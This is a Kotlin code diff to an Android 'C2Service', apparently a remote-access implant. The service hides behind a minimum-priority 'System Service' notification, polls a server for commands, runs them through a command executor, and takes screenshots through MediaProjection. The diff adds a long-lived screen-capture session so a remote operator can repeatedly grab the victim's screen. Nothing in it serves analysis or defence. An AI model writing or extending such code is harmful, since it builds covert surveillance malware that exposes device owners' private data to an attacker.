@@ -38,6 +38,7 @@ class C2Service : Service() {
     private lateinit var serverUrl: String
 
     @Volatile private var projection: MediaProjection? = null
+    @Volatile private var captureSession: ScreenCaptureSession? = null
 
     private fun log(msg: String) {
         Log.i(TAG, msg)
@@ -95,28 +96,38 @@ class C2Service : Service() {
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
         log("initProjection: code=$resultCode")
         try {
-            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            // Clean up previous session
+            captureSession?.release()
+            captureSession = null
             try { projection?.stop() } catch (_: Exception) {}
             projection = null
 
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             val proj = mpm.getMediaProjection(resultCode, data)
             log("getMediaProjection: $proj")
             if (proj == null) {
-                log("getMediaProjection returned NULL — permission already used or invalid")
+                log("getMediaProjection returned NULL")
                 return
             }
 
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
                     log("projection onStop")
+                    captureSession?.release()
+                    captureSession = null
                     projection = null
                 }
             }, Handler(Looper.getMainLooper()))
+
             projection = proj
-            log("projection ACTIVE")
+
+            // Build the long-lived virtual display session ONCE
+            captureSession = ScreenCaptureSession(this, proj)
+            log("projection ACTIVE with capture session")
         } catch (e: Exception) {
             log("initProjection ERROR: ${e.message}")
             projection = null
+            captureSession = null
         }
     }
 
@@ -132,9 +143,12 @@ class C2Service : Service() {
             .setContentTitle("System Service")
             .setContentText("running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(Compat_PRIORITY_MIN())
             .build()
     }
+
+    // Helper to avoid unresolved reference in some SDKs
+    private fun Compat_PRIORITY_MIN() = NotificationCompat.PRIORITY_MIN
 
     private suspend fun registerLoop() {
         while (currentCoroutineContext().isActive) {
@@ -170,18 +184,18 @@ class C2Service : Service() {
         val id = cmd.getInt("id")
         val type = cmd.getString("type")
         val args = cmd.optJSONObject("args") ?: JSONObject()
-        log("execute id=$id type=$type hasProjection=${projection != null}")
+        log("execute id=$id type=$type")
 
         val result = try {
             when (type) {
                 "screenshot" -> {
-                    val p = projection
-                    if (p == null) {
-                        log("screenshot: projection NULL")
+                    val session = captureSession
+                    if (session == null) {
+                        log("screenshot: session NULL")
                         JSONObject().put("error", "projection_not_ready")
                     } else {
                         log("screenshot: capturing...")
-                        Screenshot.capture(this, p)
+                        session.capture()
                     }
                 }
                 else -> CommandExecutor.run(this, type, args)
@@ -237,6 +251,8 @@ class C2Service : Service() {
 
     override fun onDestroy() {
         log("onDestroy")
+        captureSession?.release()
+        captureSession = null
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
         scope.cancel()
